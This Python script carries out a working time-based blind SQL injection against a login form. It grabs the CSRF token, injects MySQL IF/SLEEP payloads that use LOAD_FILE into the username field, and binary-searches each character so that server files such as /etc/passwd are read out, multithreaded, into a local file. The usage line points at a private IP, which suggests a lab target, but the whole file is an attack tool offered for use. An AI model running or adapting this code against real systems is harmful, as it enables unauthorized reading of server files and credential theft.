#usage: python3 FileRead-BinarySearch.py -u "http://172.16.8.54" -p "/etc/passwd" -o "passwd1.txt"
#!/usr/bin/env python3
import argparse
import requests
import time
import concurrent.futures
from bs4 import BeautifulSoup
from pathlib import Path
from threading import Lock
import sys

class FastSQLiExtractor:
    def __init__(self, url, path, output_file, threads=5):
        self.url = url
        self.path = path
        self.output_file = Path(output_file)
        self.threads = threads
        self.session = self._create_session()
        self.token = self._get_token()
        self.results_lock = Lock()
        self.file_lock = Lock()
        
    def _create_session(self):
        session = requests.Session()
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=self.threads * 2,
            pool_maxsize=self.threads * 2,
            max_retries=0
        )
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        session.headers.update({'Connection': 'keep-alive'})
        return session
    
    def _get_token(self):
        r = self.session.get(self.url)
        soup = BeautifulSoup(r.text, 'html.parser')
        return soup.find("input", attrs={"name": "_token"})["value"]
    
    def _binary_search_char(self, position):
        # inclui ASCII 10 (LF) para capturar quebras de linha
        low, high = 10, 126
        sleep_time = 1.5  # tempo de sleep reduzido
        
        while low < high:
            mid = (low + high) // 2
            
            payload = (
                f"admin' OR IF(ASCII(SUBSTRING(LOAD_FILE('{self.path}'),{position},1))<={mid}, "
                f"SLEEP({sleep_time}), 0)-- -"
            )
            data = {
                "_token": self.token,
                "username": payload,
                "password": "test"
            }
            
            start = time.time()
            try:
                self.session.post(self.url, data=data, timeout=sleep_time + 1)
                elapsed = time.time() - start
            except requests.Timeout:
                elapsed = sleep_time + 1
            
            if elapsed >= sleep_time:
                high = mid
            else:
                low = mid + 1
        
        return chr(low) if 10 <= low <= 126 else None
    
    def _check_position_exists(self, position):
        payload = (
            f"admin' OR IF(LENGTH(LOAD_FILE('{self.path}'))>={position}, SLEEP(1), 0)-- -"
        )
        data = {
            "_token": self.token,
            "username": payload,
            "password": "test"
        }
        
        start = time.time()
        try:
            self.session.post(self.url, data=data, timeout=2)
            elapsed = time.time() - start
        except requests.Timeout:
            elapsed = 2
        
        return elapsed >= 1
    
    def extract(self):
        # Determina posição inicial
        if not self.output_file.exists():
            self.output_file.write_text("")
            start_pos = 1
        else:
            start_pos = len(self.output_file.read_text(encoding="utf-8", errors="ignore")) + 1
        
        print(f"[*] Extraindo: {self.path}")
        print(f"[*] Posição inicial: {start_pos}")
        print(f"[*] Threads: {self.threads}")
        
        position = start_pos
        consecutive_failures = 0
        
        with self.output_file.open("a", encoding="utf-8", errors="ignore") as f:
            while True:
                # Verifica se ainda há dados
                if not self._check_position_exists(position):
                    print("\n[*] Fim do arquivo detectado.")
                    break
                
                # Extrai batch de caracteres em paralelo
                batch_size = min(self.threads, 10)
                positions = range(position, position + batch_size)
                
                with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
                    future_to_pos = {
                        executor.submit(self._binary_search_char, pos): pos 
                        for pos in positions
                    }
                    
                    results = {}
                    for future in concurrent.futures.as_completed(future_to_pos):
                        pos = future_to_pos[future]
                        try:
                            char = future.result()
                            if char:
                                results[pos] = char
                                consecutive_failures = 0
                            else:
                                consecutive_failures += 1
                        except Exception as e:
                            print(f"\n[!] Erro na posição {pos}: {e}")
                            consecutive_failures += 1
                
                # Escreve resultados ordenados
                for pos in sorted(results.keys()):
                    char = results[pos]
                    f.write(char)
                    f.flush()
                    # Se for quebra de linha, apenas pula linha
                    if char == '\n':
                        print()
                    else:
                        print(f"[+] ({pos}) {char!r}", end=' ')
                        sys.stdout.flush()
                
                if not results:
                    print("\n[*] Nenhum caractere extraído no batch.")
                    break
                
                position = max(results.keys()) + 1
                
                # Para se muitas falhas consecutivas
                if consecutive_failures > 5:
                    print("\n[*] Muitas falhas consecutivas. Finalizando.")
                    break

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", required=True, help="URL da aplicação alvo")
    parser.add_argument("-p", "--path", required=True, help="Caminho do arquivo remoto")
    parser.add_argument("-o", "--output", required=True, help="Arquivo local para salvar")
    parser.add_argument("-t", "--threads", type=int, default=5, help="Número de threads (padrão: 5)")
    
    args = parser.parse_args()
    
    extractor = FastSQLiExtractor(args.url, args.path, args.output, args.threads)
    extractor.extract()

if __name__ == "__main__":
    main()